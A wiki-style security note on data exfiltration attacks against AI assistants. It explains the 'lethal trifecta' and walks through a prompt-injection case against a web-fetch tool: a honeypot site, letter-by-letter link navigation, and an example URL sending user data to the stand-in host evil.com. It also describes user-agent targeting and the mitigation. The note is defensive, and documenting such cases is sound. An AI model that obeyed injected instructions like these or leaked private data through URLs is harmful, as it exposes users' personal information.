---
tags: [data-exfiltration, prompt-injection, web-fetch-tool, lethal-trifecta, agentic-security, claude-vulnerabilities, ai-governance-risk-compliance]
---

---
tags: [adversarial-testing, agent-attack-surface, agent-design-patterns, agent-governance, agentic-blast-radius, agentic-commerce, agentic-workflows, ai-brand-discoverability, ai-citation-sources, ai-governance, ai-governance-risk-compliance, ai-harness, ai-trust-boundary, artifact-scoped-agents, artifact-scoping, automated-rollback, autonomous-agents, blast-radius, blast-radius-containment, chain-of-thought, chain-of-thought-security, coding-agents, credential-management, data-deletion-guarantees, data-privacy, data-retention-policies, decision-trail-audit, default-data-retention, enterprise-data-leakage, explainability, fake-chain-of-thought-vulnerability, financial-governance, generative-engine-optimization, geo-optimization, gpt-red, grok-build, harness-governance, human-in-the-loop, intent-verification, intent-verification-governance, least-privilege, llm-security, observable-consent, open-source-release, opt-in-vs-opt-out, policy-as-code, policy-enforcement, privacy-by-default, production-controls, prompt-injection, prompt-injection-risk, proprietary-data-exposure, red-teaming, retrospective-deletion, rust-codebase, self-play, self-play-hardening, synthetic-trajectories, system-prompts, tool-boundary-enforcement, trajectory-data, trajectory-data-governance, transaction-consent, transaction-intent-gap, trust-boundaries, zero-data-retention, data-exfiltration, lethal-trifecta, web-fetch-vulnerability, nested-link-exfiltration, honeypot-attacks, user-agent-targeting]---

## Data Exfiltration Attack Patterns

### Lethal Trifecta Attack
A class of attack combining three elements:
1. Access to private data (e.g., conversation memories, user context)
2. Tools for accessing online content that can read hostile instructions
3. Ability to exfiltrate data through URLs accessed by those tools

This attack pattern is particularly relevant for AI assistants with web browsing capabilities and persistent memory.

### Nested Link Exfiltration (July 2026)
Demonstrated vulnerability in [[claude-ai]] web_fetch tool. Attack sequence:
1. Attacker creates honeypot website with nested generated links
2. Site presents as authentication system requiring user information
3. Prompt instructs agent to "navigate letter by letter" through alphabetically organized URLs
4. Each link visit exfiltrates data via URL parameters: `https://evil.com/user-data-here`
5. Attack selectively targets AI agents via user-agent detection (Claude-User header)

**Mitigation**: Anthropic closed vulnerability by removing web_fetch's ability to navigate to additional links within fetched content. Tool now restricted to:
- Exact user-entered URLs only
- URLs returned from companion web_search tool
- No following of links discovered within fetched pages

**Data Exposed**: Successful attacks extracted user's name, home city location, employer name.

## Tool Boundary Enforcement Patterns

### Deterministic URL Restrictions
Design pattern for web-browsing tools that prevents URL concatenation attacks by:
- Restricting navigation to exact URLs from trusted sources (user input, search results)
- Blocking programmatic URL construction from private data
- Preventing navigation to URLs discovered during browsing sessions

This approach trades functionality (no link following) for security guarantees against data exfiltration.

### User-Agent Targeted Attacks
Adversaries can fingerprint AI agents and serve different content:
- Detection via specific user-agent strings (e.g., "Claude-User")
- Honeypot content shown only to AI agents
- Makes manual security review more difficult

See also: [[evals-production-deployment]] for adversarial testing approaches, [[agentic-workflows-production]] for production safeguards.